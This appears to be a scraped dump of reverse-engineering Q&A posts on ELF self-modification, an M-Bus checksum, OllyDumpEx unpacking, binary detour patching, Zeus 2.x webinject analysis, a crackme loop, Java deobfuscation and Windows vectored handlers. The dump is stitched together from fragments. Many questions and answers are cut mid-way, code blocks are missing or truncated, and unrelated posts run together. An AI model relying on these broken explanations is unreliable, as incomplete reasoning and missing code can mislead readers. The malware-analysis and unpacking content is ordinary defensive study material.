<p>Since the program has no <code>INTERP</code> segment, the first executed instruction must be at <code>0xc023dc</code>. But this address is outside any ""reliably"" mapped data, we cannot sure which instruction will be executed. I think that this ELF should have some random behaviors (e.g. it should be crashed usually), but it is not, it executes normally, without any crash.</p>

<p>NB2. Using a Pintool to trace out what happens, I find the <code>OEP</code> of the program is at <code>0xc01dfa</code> since its trace is:</p>

</code></pre>

<p>But I still cannot understand why the instruction at <code>0xc023dc</code> is always <code>mov dword ptr [0xc01bf0], 0x252e8</code> (so the binary is somehow ""self-modified"")</p>
","<p>File/memory mappings are always multiples of the page size, on x86 this is usually 4k. The mapping length here, <code>0x13c7</code> will be rounded up to a multiple of the page size meaning that <code>0x2000</code> bytes will be mapped. If you look the raw file at offset <code>0x13dc</code> you should find these 'extra' instructions.
The rounding up to page size is necessary because the memory manager and processor page tables work on 4k granularity to reduce the overhead of memory management.</p>

<p>There is self-modification going on too. It is the write to memory from the instruction at <code>0xc023dc</code> which creates the CALL (0xE8) instruction you see at address <code>0xC01BF0</code>.  This won't be in the raw file.   The write to the code is possible because the code is, unusually, mapped with write (<code>W</code>) access in the program header.</p>

"Calculating check sum of m-bus data frame","597","","<p>I'm trying to calculate the check sum of a m-bus data frame. In page 1 of <a href=""http://bg-etech.de/download/manual/SDM630-Mbus-protocol.pdf"" rel=""nofollow"">this PDF</a> I'm able to read that the frame's check sum ""is calculated from the arithmetical sum of the data mentioned above, without taking carry digits into account"". The data I have above are the bytes:</p>

<ol>
<li>Start</li>
<li>L Field</li>
<li>L Field</li>
<li>Start</li>
<li>C Field</li>
<li>A Field</li>
<li>CI Field</li>
<li>Check sum</li>
<li>Stop</li>
</ol>

<p>In page 2 we can find that one example of a valid data frame is:</p>

<pre><code>68 03 03 68 53 01 BB 0F 16
</code></pre>

<p>In hexadecimal, being 0F the check sum. Unfortunately I must be doing something wrong because I'm not able to reach that value.</p>

<p>Could someone explain how this algorithm, to find the check sum, works?</p>
","<p>just one sample is never sufficient to answer a checksum query you need a bunch of samples to corelate and find patterns  </p>

<p>so looking at the linked pdf it seems it is clear enough</p>

<p>skip the start and sum the data and extract the least two bytes </p>

<pre><code>skip     sum     mask 
x,x,x,x | y,y,... 0x000000ff = checksum
</code></pre>

<p>so the sample you posted would be </p>

<pre><code>skip         | sum            
68 , 3 ,3 68 | 53 , 01 , bb |  =
</code></pre>

<p>checksum</p>

<pre><code>""{0:X2}"" -f ((0x53+0x1+0xbb) -band 0x000000ff) = 0x0f seems to match 
</code></pre>

<p>running this on other sequnces in the pdf seem to tally</p>

<pre><code>PS C:\&gt; $a = ""{0:X2}"" -f ((0x53+0xfe+0x51+0x01+0x7a+0x01) -band 0x000000ff) ; $a
1E 
PS C:\&gt; $a = ""{0:X2}"" -f ((0x73+0x01+0x51+0x01+0x7A+0x02 ) -band 0x000000ff) ; $a

<p>To unpack the exe I'm using <a href=""http://www.ollydbg.de/version2.html"" rel=""nofollow noreferrer"">OllyDbg v201</a> and the latest version of <a href=""https://low-priority.appspot.com/ollydumpex/OllyDumpEx.zip"" rel=""nofollow noreferrer"">OllyDumpEx v1.50</a>. Problem here is, the OllyDebugEx's website only has these sections {Overview, Features, Screenshots, Supported Debuggers, Download, Changelog}, no documentation at all, which means the plugin assumes you've already experience with the whole bunch of options/terms.</p>

<p>Right now I've reached the point where I've figured out how to uncompress my test executable and finding the OEP, current status below:</p>

<p><a href=""https://i.stack.imgur.com/fvVld.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/fvVld.png"" alt=""enter image description here""></a></p>

<p>What I'd like to know now is understand the whole set of available options provided by OllyDumpEx:</p>

<ul>
<li>Module {PE Base, List Section, Dump Mode, PE Source}</li>
<li>Search { Search Area, Search Mode}</li>
<li>PE {Image Base, Section Align, Entry Point}</li>
<li>Options</li>
<li>Section</li>
</ul>

<p>Once I know how to dump it properly I'd also like to know how to fix it so I'll get the final uncompressed exe.</p>
","<p>Just out of curiosity i downloaded crinkler 
compiled this code with visual c++</p>

<p>based on these the uncompressed executable may be impossible to dump without serious code ( it doesn't have any import table / nor pe header to work with )</p>

<p>you may have to prepend a pe header and append an import section to the raw memory </p>

<p>as to ollydumpex it is a tool with lots of options </p>

<p>pebase 
you can either select any module , memory range , address range 
list section will list the found section based on the pebase selection 
for example if you choose memory list sections will list the whole virtual address range from 0x10000 to 0x7fffffff (32 bit 2 gb va range )
when you rescan  search pe searches for pe header in the range </p>

<p>dump mode rebuild tries to rebuild the imports if possible (possibly runnable exe)</p>

<p>raw dumps what is in memory (usefull for forensics not fro running the exe) </p>

<p>but you can see ollydumpex complaining corrupt header in status bar 
so dumping with ollydumpex is not a viable option as of now</p>

<p>well you can dump the contents if you start coding a special dumper 
fill the pe headers imports etc it might be serious work maybe </p>

"Insert jmp detour into a compiled program","595","","<p>I've seen references on Stack Exchange and elsewhere to inserting detours into compiled code. My understanding is that essentially a jmp instruction is inserted and then somehow the patched program is linked with additional code that contains the target of the jmp.</p>

<p>As a concrete but (hopefully) simple example, consider a program.</p>

<pre><code>#include &lt;stdio.h&gt;

void hello(void) {
    printf(""Hello "");
    printf(""world!\n"");
}

int main(void) {
    hello();
}
</code></pre>

<p>Suppose I have only a binary compiled from this program. No measures have been taken to strip symbols or obfuscate the program in any way. I want to insert a detour to call code compiled from this function.</p>

<pre><code>#include &lt;stdio.h&gt;

void detour(void) {
    printf(""detoured "");
}
</code></pre>

<p>The output of the patched program should be:</p>

<blockquote>
  <p>Hello detoured world!</p>
</blockquote>

<p>How would I do that? How would I avoid breaking address offsets in the compiled code?</p>

<p>My available compilers are gcc, clang, and icc. My available operating systems are OS X and Ubuntu. Choose whatever you prefer in your answer.</p>

<p>If this can't reasonably be answered here then a brief overview and a pointer to some reading material would also be a good answer.</p>

<p>I'm aware of LD_PRELOAD and ld --wrap. The example was chosen so that those methods do not easily suffice. (You could of course just detour the entire hello() function to one that prints ""Hello detoured world!"" but lets pretend you don't have the source code and the function is non-trivial.)</p>

<p><strong>Related Questions</strong></p>

<p>I was first going to ask how to simply disassemble and reassemble a compiled program but that has been asked. The response was that it's extremely difficult. My sense from the answers is that it's not a common thing to do. I suspect my assumption that disassembling and reassembling is a necessary step for detouring might not be correct.</p>

<p><a href=""https://reverseengineering.stackexchange.com/questions/3800/why-there-are-not-any-disassemblers-that-can-generate-re-assemblable-asm-code/4133#4133"">Why there are not any disassemblers that can generate re-assemblable asm code?</a></p>

<p>A similar question on StackOverflow received a lukewarm response. This question is focused just on inserting a detour rather than ""modification"" in general and I think the audience here will be more receptive.</p>

<p><a href=""https://stackoverflow.com/questions/4309771/disassembling-modifying-and-then-reassembling-a-linux-executable"">https://stackoverflow.com/questions/4309771/disassembling-modifying-and-then-reassembling-a-linux-executable</a></p>

<p>This Reverse Engineering question asks about modifying binaries in general. A lot of different tools and LD_PRELOAD are mentioned. Some answers say it's possible to do this with a hex editor. I think that's the method I'd be most interested in.</p>

you might want to use that binary if you want to retrace the following
steps, because if you don't have the exact version of the C compiler and
libs, your binary might be different.</p>

<p>As you see, the strings <code>Hello</code>, <code>world</code> are in the read-only data section, at 400634 and 40063b. These offsets are passed
to <code>printf</code> and <code>puts</code> in <code>hello</code>. Why <code>puts</code>? Well, the optimizer is clever enough to rewrite a printf of a constant string
that ends in '\n' into a puts; you can see the '\n' is omitted from the string in the .rodata section.</p>

<p>Now, we want to insert a <code>puts(""detoured"")</code>. But there's no space in the hello function, and if we tried to insert some bytes
there, everything else in the program would be moved, which we want to avoid. Also, there's no space in the .rodata section
for another string, the .eh_frame_hdr starts directly behind it.</p>

<p>However, check address 4005a7. The main function returns at 4005a6, and the C compiler used some padding to get the next
function,  __libc_csu_init, at a 16-byte boundary. Which means there are a few unused bytes that we can make use of.
Looking through the rest of the disassembly, we find some more bytes like that:</p>

<pre><code>4004ba          66 0f 1f 44 00 00
4004e9          0f 1f 80 00 00 00 00
400529          0f 1f 80 00 00 00 00
4005a7          66 0f 1f 84 00 00 00 00 00
400615          66 66 2e 0f 1f 84 00 00 00 00 00
</code></pre>

<p>The last one of these, 400615, has the size to fit the ""detoured "" string in.</p>

<p>Now what we're going to do with the assembly is patch it to:</p>

<pre><code>400590          jmp 4004e9                              e9 54 ff ff ff
4004e9          mov $0x400615, %edi; jmp 400529         bf 15 06 40 00 eb 39
400529          callq 400460; jmp 4005a7                e8 32 ff ff ff eb 77
4005a7          mov 0x40063b, %edi; jmp 400595          bf eb 06 40 00 eb e7
</code></pre>

<p>which overwrites the instruction at 400590, places the required instructions in the spare bytes, adds jumps between the parts,
and restores the overwritten mov before jumping to the next instruction.</p>

<p>Now, it's time to use a hex editor to apply these patches to the binary (don't forget to move the 'detoured ' string to 400615
as well). The resulting binary should be identical to detour.patched from the zip.</p>

<p>Last, we run the patched program:</p>

<pre><code>$ detour.patched
Hello detoured world!
</code></pre>

<p>As you see, the trick is to make us of unused regions within the program, to avoid moving stuff around, which would break offsets.
I cheated a bit when i put the ""detoured"" string into the code section - this would fail if anything wanted to write-access the string.
If i wanted writable data, i would need to use the data section, and possibly even extend it - but that case is much more
compliated since i'd have to fiddle with the ELF headers and sizes, and i'd probably need specific ELF tools to get it right.
The current example needs nothing but a hex editor. I even crafted the hex coded manually from the opcodes; to get a bit more 
sophisticated, use the radare2 tool.</p>

  <p>Is it possible to identify a protocol in a pcap file?</p>

<p>Yes, but this appears to be a proprietary protocol over TCP/IP.</p>

<p>The first four bytes of every message is a 32-bit big-endian value that specifies the length of the following bytes in the message.</p>

<p>The messages aren't encrypted, so you might be able to do some data carving. But if you really want to know what's going on, your best bet is to reverse engineer your ""MEye"" app as opposed to relying solely on the packet capture to understand the protocol.</p>

"Problem with entry point detection as a file offset","594","","<p>I have found problem with finding file offset which actually is program entry point.</p>

<p>In case I experience problem, value of AddressOfEntryPoint is 0x1018. Here is a section which maps this address.</p>

<p><img src=""https://i.stack.imgur.com/903S0.png"" alt=""Section header""></p>

<p>I assume entry point should be <code>0x28 = 0x10 + 0x1018 - 0x1000 (PointerToRawData + AddressOfEntryPoint - VirtualAddress)</code></p>

<p>However tools says it is 0x18 instead. I'm not sure why, made some experiments and came up with another formula. </p>

<pre><code>0x18 = (0x10 / 0x200) * 0x200 + 0x1018 - 0x1000 ((PointerToRawData / FileAlignment) * FileAlignment + AddressOfEntryPoint - VirtualAddress)

","<p>Decompilation is useful for reverse engineering, but in most cases, you won't be able to recompile the results, because compilation and decompilation are lossy processes and obfuscation exacerbates that.</p>

<p>If you understand Java bytecode, a good way to edit JARs is to use a bytecode assembler/disassembler such as <a href=""https://github.com/Storyyeller/Krakatau"" rel=""nofollow noreferrer"">Krakatau</a>.

<p>You can recognize it quickly solely by its name : 50 * sizeof(int) = 200 = 0xC8. The next variable on the stack is <code>numb_of_elements</code> which is positionned on -0x10 on the stack, thus we have some memory between -0xD8 and -0x10 that corresponds to the <code>int</code> array.</p>

<p>John Doe,</p>

<p>Again thanks. Here are some images of what I was able to get working on my PC laptop using CHIPSCOPE. Chipscope came with Xilinx WebPack, like I said above in my comment.

<p>So should I bring over the .ELF files from my Mac and open them up with my SDK Tools? Or better question, where can I learn more about this process so I stop asking stupid questions? I'm not too familiar with how to use the Xilinxs SDK Tools and how to configure the FPGA with these microblazers .ELF files.</p>

<p>Thanks again.</p>
","<p>Your camera has a Xilinx FPGA inside. FPGA design likely includes Microblaze soft CPU core. Files extracted by binwalk appear to be valid ELF files, so you'll just need to download Microblaze toolchain. The easiest way to do so is to download Vivado WebPack (it's free) and install it — you'll find a toolchain in the Xilinx SDK folder.</p>

","<p><code>-d</code> only disassembles what objdump considers to be code sections. You can use <code>-D</code> to force disassembly of all sections. However, it still doesn't work for this file because it doesn't have a <em>section table</em>:</p>

<p>So, in this case you can ask objdump to treat the file as binary and disassemble everything:</p>

<p>To improve disassembly, you can use the information from the ELF headers (load address and entrypoint address):</p>

"Studying Zeus 2.X","583","","<p>I'm doing some study on Zeus 2.x, trying to wrap my head around how it works. By using <a href=""https://github.com/Visgean/Zeus"" rel=""nofollow"">this code</a>. I've built my own builder to work on my test environment.</p>

<p>Right know I want to do a very specific thing, which is extracting from memory the webinjects configuration. The first experiments I did was to attach to IExplorer and monitor calls to functions I know Zeus hooks, like <code>HttpSendRequest*</code>. I was expecting that at some point while stepping through those executions I'd see the injections configuration loaded into memory. I've tried to automate the proccess setting a breakpoint upon call of this function and using OllyDbg's Memory Watch plugin, which dumps every string it encounters.</p>

<blockquote>
  <p>So now I want to pinpoint and understand exactly where should I look to see this decrypted configuration in memory.</p>
</blockquote>

<p>My assumptions so far:</p>

<ul>
<li>I'm unable to see anything strange because the <code>HttpSendRequestX</code> function I'm setting a breakpoint is actually the original, unchanged from Wininet;</li>
<li>Dumping memory of the machine and analysing it offline is not enough, since the structure which holds the webinjects (BinStorage) is loaded in memory when it's needed and then discarded (free'd) </li>
</ul>

<p>At this point I was thinking to monitor calls to <code>VirtualAlloc</code> and place a breakpoint on memory write on those newly allocated areas (at some point Zeus is bound to place there the encrypted configuration and then decrypt it).</p>

<p>But this is still a long shot. Any ideas? Also I'm doing most of this work by attaching on <code>IExplore.exe</code>, should I do it on <code>explorer.exe</code> instead?</p>

<p>Any tips are appreciated !</p>
","<p>Answering my own question for further reference:</p>

<p>Zeus and many other MiTB capable trojans use API hooking as preferred method to inject malicious code in the webpages before they are rendered by the victim. API hooking is sort of like doing a MiTM of a system call, whereby the bot intercepts the call, takes ownership and control, performs some malicious action and then returns control to the original function. Something like:</p>

<p>call <code>network_function</code>:</p>

<pre><code>JMP XYZ ----&gt; JMPs to malicious code 
..                |
..                |
...           &lt;---- returns to the original function
</code></pre>

<p>So, in this scenario, in order to extract the web injects, the best bet was to understand the logic of the trojan. That is, after a user opens a URL in the browser, this URL will be matched with a list containing the configuration of which URLs to inject. This will surely be performed on Wininet functions such as <code>HttpSendRequest</code>, <code>HttpOpenRequest</code>, etc. If we breakpoint on that function in the main process of <code>IExplore.exe</code> (in an infected machine) we'll see the first instruction to be that <code>JMP</code> instruction we've talked about. If we then proceed to step into, we'll access the actual instructions using the structure BinStorage and other, all related to Zeus. Since there is still a lot of code to go through and the interest was to retrieve the webinjects, one approach is to monitor for decryption / decode instructions (Zeus's configuration is stored encrypted; it only makes sense that if we monitor the instructions responsible for this operation will lead us to the actual decrypted content). </p>

<p>In this case searching for the sequence of bytes</p>

<pre><code> MOV ANY, ANY
 XOR ANY, ANY
 INC EAX
 DEC ESI
</code></pre>

<p>If we breakpoint after the last instruction and then inspect the contents of the memory address pointed by the destination operands in the <code>MOV</code>/<code>XOR</code> operations we will most likely find the decrypted payload (i.e. our dynamic configuration section).</p>

</code></pre>

<p>but it's too complicated for me right now. So I know that the password length should be 40 but how does the other part of the code work?</p>

<p>The unclear parts are the <code>unt8_t</code> casts. I've used gdb to step through the code, and I saw the results of certain instructions but cannot understand why these are the results ?</p>
","<p>Although OP clarified only the inner <code>for</code> is unreadable to him, I'll write an answer that thoroughly explains the first few lines and then abruptly stops at the most crucial part of the inner for loop. While believing examples are a great way to learn, I do that to make this as educational as possible, without interfering with the learning process of independently solving exercises. I am also unfamiliar with the specific set of exercises and would like to avoid providing full answers where those were not intended by the creator.</p>

<p>I hope i hit that sweet spot of being educational enough yet not too much.</p>

<p>Good luck with the exercise, here goes:</p>

<p><code>var_18 = 0x1;</code></p>

<p>Set an internal state to 1.</p>

<p><code>while (var_18 != 0x0) {</code></p>

<p>While state is <code>True</code>, continue executing loop's content. The state is actually a boolean indicating processing is not finished yet.</p>

<p><code>var_18 = 0x0;</code></p>

<p>Set internal state to zero at every outer loop iteration. This means every iteration must set the ""not finished yet"" flag.</p>

<p><code>for (var_14 = 0x0; var_14 &lt;= 0x27; var_14 = var_14 + 0x1) {</code></p>

<p>Inner for iterates 0x28 times, 40 in decimal. Since we know this is the length of the entire string, we can assume the inner loop somehow iterates over all characters of the string. This might be a coincidence, but we should keep an eye for it.</p>

<p><code>if ((*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff) != 0x0) {</code></p>

<p>Now here it gets a little bit more complicated, so we'll split it to several parts:</p>

<p><code>sign_extend_32(var_14)</code></p>

<p>Since we know var_14 is a non negative integer between 0 and 39 (including), there's no meaning to sign-extending it. Sign-extending is basically the operation of converting a shorter length value to longer, taking the sign bit into account. See <a href=""https://en.wikipedia.org/wiki/Sign_extension"" rel=""nofollow"">this</a> for more info about sign-extension. This is either a compiler or decompiler artifact. A more advanced decompiler might have removed this.</p>

<p><code>(int8_t *)(sign_extend_32(var_14) + 0x6010a0)</code></p>

<p>Add our <code>var_14</code> to a relatively long hex offset. By the looks of it, it's probably an offset to table of 40 bytes. This is learnt from experience, taking a look at value at that address might clear it up. Adding <code>var_14</code> and then casting to an int8 pointer further suggests that's the case, using <code>var_14</code> as the index in that table.</p>

<p><code>(*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff)</code></p>

<p>If we weren't convinced yet, by now it's pretty clear as we read a byte from the resulting offset. AND-ing it with 0xff is yet another decompiler artifact, caused by how a compiler will read a byte in 64bit intel processors.</p>

<p><code>if ((*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff) != 0x0) {</code></p>

<p>back to the full line, this is reading the byte from the table, and skipping the current iteraction of the inner loop.</p>

<p><code>rax = random();</code></p>

<p>Simple. Set a random value into <code>rax</code>.</p>

<p><code>rcx = *(int8_t *)(sign_extend_64(var_14) + 0x6010a0) &amp; 0xff &amp; 0xff;</code></p>

<p>This is actually quite identical to the condition from before, only now the value of that index in the table is stored into <code>rcx</code>.</p>

<h2>remaining lines of code</h2>

<pre><code>                                temp_3 = rax % rcx;
                                *(int8_t *)(sign_extend_32(var_14) + 0x6010a0) = (*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff) - temp_3 + 0x1;
                                var_18 = var_18 | *(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff &amp; 0xff;
                                *(int8_t *)(sign_extend_32(var_14) + ""this_is_not_even_interesting_its_garbage"") = (*(int8_t *)(sign_extend_32(var_14) + ""this_is_not_even_interesting_its_garbage"") &amp; 0xff) - temp_3 + 0x1;
                        }
                }

        rax = *master;

"java byte code equivalent of IDA function signatures","573","","<p>I remember IDA (Interactive Disassembler) has a really neat feature of function signatures where you dont have to reverse engineer code found inside standard libraries.<br>
Is there a similar feature for java byte code especially for obfuscaticated code? </p>
","<p>There is no similar feature for java byte code.</p>

<p>When you compile a C program, and statically link it to a standard library, the library code will be present, more or less unmodified, within the binary (except for addresses which will change), but there won't be any hint that a particular function had a particular name before being compiled (unless debugging is enabled while compiling/linking). But, any given function has a more or less fixed pattern of bytes, and by recognizing these bytes, IDA can assign the original name to the function.</p>

<p>In java bytecode, there is no neccesity to do this. Function names, variable names, and similar information is present in the compiled bytecode anyway. The ""standard library"", <code>rt.jar</code>, isn't embedded into the bytecode either, so if a class uses an <code>ArrayList</code>, the class will have a reference to <code>java.util.ArrayList</code> even after the obfuscation process. So, nothing to do here for a signature analyzer.</p>

<p>If the application choses to obfuscate the standard library as well, it needs to include that obfuscated library into its own jar files. This will probably raise some licensing issues, but apart from that, as the obfuscator will rename methods and fields, the byte code of that obfuscated library will be too different from the original byte code to be recognizable by a feature like IDA's FLIRT. Also, you can't just rename the method in IDA, because you'd have to modify all the references as well.</p>

<p>However, there is at least one open source project that has a similar problem like yours, and they seem to have solved it quite well. <a href=""https://minecraft.net/"" rel=""nofollow"">Minecraft</a> is a popular game that includes a server that's written in java (and obfuscated); the <a href=""https://www.spigotmc.org/"" rel=""nofollow"">Spigot</a> project decompiles this server, changes some things, adds an API, and distributes the result. Specifically, to avoid licensing issues, they distribute a build system which downloads, decompiles, patches, and recompiles the minecraft server on the user's machine.</p>

<p>They use the <a href=""https://github.com/fesh0r/fernflower"" rel=""nofollow"">fernflower</a> decompiler, which has an option to rename symbols while decompiling, and include an extensive map of obfuscated-to-readable symbol names. Example:</p>

<pre><code>AttributeInstance a ()LIAttribute; getAttribute
AttributeInstance a (D)V setValue
AttributeInstance e ()D getValue
AttributeMapServer b ()Ljava/util/Set; getAttributes
AxisAlignedBB b (DDD)LAxisAlignedBB; grow
</code></pre>

<p>The source code, which is generated using these maps, is obviously way more readable than the original one. And, at least for the spigot project, recompiling this source (after adding some patches to create an API) yields a working minecraft server.</p>

<p>So, maybe, this could be a way for you to proceed - use fernflower to decompile your classes, load them into an editor to find some useful code and assign readable class names, write a mapping file, and repeat this a few times. Then, when you want to do some dynamic analysis, recompile the decompiled java code and load that into IDA.</p>

<p>Of course, this approach still has some problems:</p>

<ul>
<li>you will still have to identify each function manually - but as i said, you probably won't find any standard library functions in your code anyway. And, there are no existing signature libraries for whichever method you use, so there's probably no way around that.</li>
<li>the decompiled/recompiled code may not work, because of bugs/shortcomings in the java decompiler itself</li>
<li>the decompiled/recompiled code may not work because of the obfuscator; for example, the obfuscator might replace all string constants with something like <code>Obfuscator::decode(""some_crypted_stuff"")</code>, where the <code>decode</code> function uses the name of the calling class as its decryption key, meaning the decryption fails when the class gets renamed</li>
<li>the obfuscator might bring its own class loader, which mangles the class name before loading it; for example, it might know to turn a <code>com.obfuscate.SOME_BASE_64_STRING</code> class into the decoded base64 string, so <code>com.obfuscate.amF2YS51dGlsLkFycmF5TGlzdAo.something()</code> would call <code>java.util.ArrayList.something()</code>. This breaks the visible connection between caller and callee (but the name mapping could solve this problem quite well and you could automate a lot)</li>
</ul>

<p>Even if you can't get a decompiled, recompilable, version of your binary, you can probably write some code that works on the decompiled source to identify functions by their behaviour, using some heuristics, Then, have your code write a mapping table, and write a python plugin to import that mapping table into your code as comments.</p>

<p>It's questionable if these approaches beat manual reverseengineering within IDA, but as IDA doesn't have this feature, and as there are no generic signature libraries (and they wouldn't work anyway, see above), it's the best i have to offer.</p>

<h2>Edit 2016-04-17</h2>

<p>Turns out i have a little project where i could use some deobfuscation mapping myself, and checked into the deobfuscation process of the minecraft decompiling step a bit more.</p>

<p>Turns out they don't even use fernflowers remapping feature. Instead, they have their own set of tools. These are lamentably underdocumented, but there seems to be a <a href=""https://github.com/md-5/SpecialSource"" rel=""nofollow"">GitHub Repository</a>.</p>

<p>The first one, <a href=""https://hub.spigotmc.org/stash/projects/SPIGOT/repos/builddata/browse/bin/SpecialSource.jar"" rel=""nofollow"">SpecialSource.jar</a>, compares an obfuscated jar with an unobfuscated version, and generates a mapping table. This seems to allow to build new tables quickly when a new version of the obfuscated original comes out. There is, however, no documentation about what's exactly being compared.</p>

<p>The second one, <a href=""https://hub.spigotmc.org/stash/projects/SPIGOT/repos/builddata/browse/bin/SpecialSource-2.jar"" rel=""nofollow"">SpecialSource-2.jar</a>, remaps class and method references and names <em>directly in the jar file</em>, without a decompilation/compilation step, so it avoids all the problems that come with that. So once you have a mapping file, you can apply it to the jar to get an output jar, which you can then feed into IDA, or a decompiler of your choice.
Usage is</p>

<pre><code>java -jar /path/to/SpecialSource-2.jar map -m mapping.csrg \
-i obfuscated.jar -o readable.jar
</code></pre>

<p>with the mappings file looking like this</p>

<pre><code># This renames a class, given the obfuscated name and the readable one
com/example/ab/a MyNiceClassName
# This renames a method, given the class, method, signature, and readable name.
MyNiceClassName a (D)I doubleToInt

<p>Note:Its a virus sample and I am a starter.Thanks for the answers in advance...</p>
","<p>In Windows, the total space the process is intended to see is the same in the CS, DS, and SS registers. Windows makes the executable file, as well as any DLLs, open files, allocated memory segments, etc. into this address range, and you'll see the same memory - and the same contents - no matter if you access cs:[something], ds:[something] or ss:[something]*.</p>

<p>On a 32 bit system, the reachable memory in this ""big space"" is 4 GB.</p>

<p>FS is different; it's a separate part of memory outside your normal address space. You can't access that memory using either of the normal registers. And its size is only a few bytes - you can't access FS:[100000h], for example, as the PEB isn't that big.</p>

<p>Back to the linear 4 GB space: the fact that 4 GB are ""reachable"" comes from 32 bit pointers (2^32); but it doesn't mean every address within that range is actually mapped to physical memory. Whenever windows needs a chunk of memory, it selects an address within that space, maps physical memory to it, and uses that memory. For example, when an executable gets loaded, windows will always** load it to <code>400000h</code> . This is why your program starts at <code>401000h</code> - your entry point of <code>1000h</code>  is relative to the load address, not to 0. Or, when windows loads a DLL, it will start with <code>80000000</code>, adjust that value down to below other DLLs, randomize it a bit (for ASLR), and use that address. If your DLL has an entry point at <code>1000h</code>, and gets loaded at <code>63000000h</code>, execution will start at <code>63001000h</code>.</p>

<p>The fact you can't access cs:[0] or ds:[0] is on purpose - windows doesn't map anything to the first bytes of the address space to make your program crash (technically: throw an execption) if it tries to access memory through a NULL pointer. This is, as well, the reason why executables get loaded higher in memory, you don't want a null pointer access to ever succeed accidentally.</p>

<p>The next thing to consider is <em>how</em> windows loads PE files - instead of parsing the file, and copying only the regions to memory that are actually used, it just slurps in the whole file to the start address***. Which means, the PE header gets loaded right to the load address. The pseudo code you've seen is just a part of the PE header that happens to be at offset <code>400h</code> in your PE file.</p>

<p>To become familiar with memory layout of the ""big"" cs/ds/ss segment, i recommend the <code>vmmap</code> tool from the sysinternals collection; attach it to some running processes and check their memory map. The details will probably become much more clear from that than from any theoretical explanation.</p>

<p>(*) However, depending on access rights, you may not be allowed to write to those parts of this space that are mapped to code, or execute those parts that are mapped to data.</p>

<p>(**) for a somewhat fuzzy definition of always, the details aren't important right now</p>

<p>(***) Technically, it memory maps the file and relies on the paging subsystem to read it from disk, but again, this isn't important right now.</p>

"What are the Vectored Continue Handlers","564","","<p>Practically everyone knows what <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms681420(v=vs.85).aspx"" rel=""nofollow noreferrer"">Vectored Exception Handlers</a> are, but I couldn't find a lot of information about the similar ""Vectored Continue Handlers"" and related functions I encountered today, such as <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms679273(v=vs.85).aspx"" rel=""nofollow noreferrer"">AddVectoredContinueHandler</a> and <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms680567(v=vs.85).aspx"" rel=""nofollow noreferrer"">RemoveVectoredContinueHandler</a>.</p>

<p>The prototype of <code>AddVectoredContinueHandler</code> is very similar to <code>AddVectoredExceptionHandler</code>'s prototype:</p>

<pre><code>PVOID WINAPI AddVectoredContinueHandler(
  _In_ ULONG                       FirstHandler,
  _In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler
);
</code></pre>

<p>And to make things more confusing it accepts a <code>PVECTORED_EXCEPTION_HANDLER</code>, just as <code>AddVectoredExceptionHandler</code> does.</p>

<p>What is the purpose of Vectored <strong>Continue</strong> Handlers and how are they used?</p>
","<p>Unfortunately MSDN and windows API documentation is really scarce here, and I had difficulties finding anything other than the minimal description in MSDN.</p>

<p>It turns out the Vectored <em>Continue</em> Handlers are maintained in a Linked list very similar to the one used for Vectored <em>Exception</em> Handlers. They are so similar, that the function's prototypes are practically identical.</p>

<p>Take a look at:</p>

<pre><code>PVOID WINAPI AddVectoredExceptionHandler(
  _In_ ULONG                       FirstHandler,
  _In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler
);
</code></pre>

<p>Compared to:</p>

<pre><code>PVOID WINAPI AddVectoredContinueHandler(
  _In_ ULONG                       FirstHandler,
  _In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler
);
</code></pre>

<p>Luckily, Vectored <em>Exception</em> Handlers are more commonly used and documented. For example, MSDN has a <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms681420(v=vs.85).aspx"" rel=""nofollow noreferrer"">page</a> about VEHs, containing the following paragraph:</p>

<blockquote>
  <p>Vectored exception handlers are an extension to structured exception handling. An application can register a function to watch or handle all exceptions for the application. Vectored handlers are not frame-based, therefore, you can add a handler that will be called regardless of where you are in a call frame. Vectored handlers are called in the order that they were added, after the debugger gets a first chance notification, but before the system begins unwinding the stack.</p>
</blockquote>

<p>The same page has only a laconic reference to the Add and Remove VCH APIs.</p>

<p>After some research and reverse engineering of ntdll, I realized VCHs and VEHs are quite similar in implementation. For example, see how <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> are identical except for the <code>VectoredListIndex</code>, specifying they should be added to the second <code>VectorHandlerList</code> in the case of VCH:</p>

<p><a href=""https://i.stack.imgur.com/NcS2S.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NcS2S.png"" alt=""AddVectoredExceptionHandler VS AddVectoredContinueHandler""></a></p>

<p>Similarly, <code>RemoveVectoredExceptionHandler</code> and <code>RemoveVectoredContinueHandler</code> are identical except for the vectored handlers list index.</p>

<p>Inside <code>RtlpAddVectoredHandler</code>, the <code>VectoredListIndex</code> is used as an index in  <code>_LdrpVectorHandlerList</code>, which is an array of size two of a linked list structure.</p>

<p>In the following picture we can see how <code>VectoredListIndex</code> is multiplied by the size of the list anchor object, and then added to `_LdrpVectorHandlerList, which is the base offset of the array.</p>

<p><a href=""https://i.stack.imgur.com/WukZJ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/WukZJ.png"" alt=""VectoredListIndex used as an array index""></a></p>

<p>And now we're getting to the interesting part - where are VEH and VCH different?</p>

<p>If we walk up the cross references to <code>_LdrpVectorHandlerList</code>, we'll notice the two flows leading up to the add/remove functions is practically identical. Aside from those four APIs, we're left with only one other function, called <code>RtlpCallVectoredHandlers</code> which is undocumented.</p>

<p>It's pretty obvious from the name, but <code>RtlpCallVectoredHandlers</code> iterates over the vector (vector is selected according to the index) and calls all Handlers in a sequence. Once a Vectored Handler returns <code>EXCEPTION_CONTINUE_EXECUTION</code> the iteration is interrupted by prematurely returning from <code>RtlpCallVectoredHandlers</code> and execution resumes.</p>

<p>The sole function calling <code>RtlpCallVectoredHandlers</code> is <code>RtlDispatchException</code>, which is the main function dispatching exception handlers.</p>

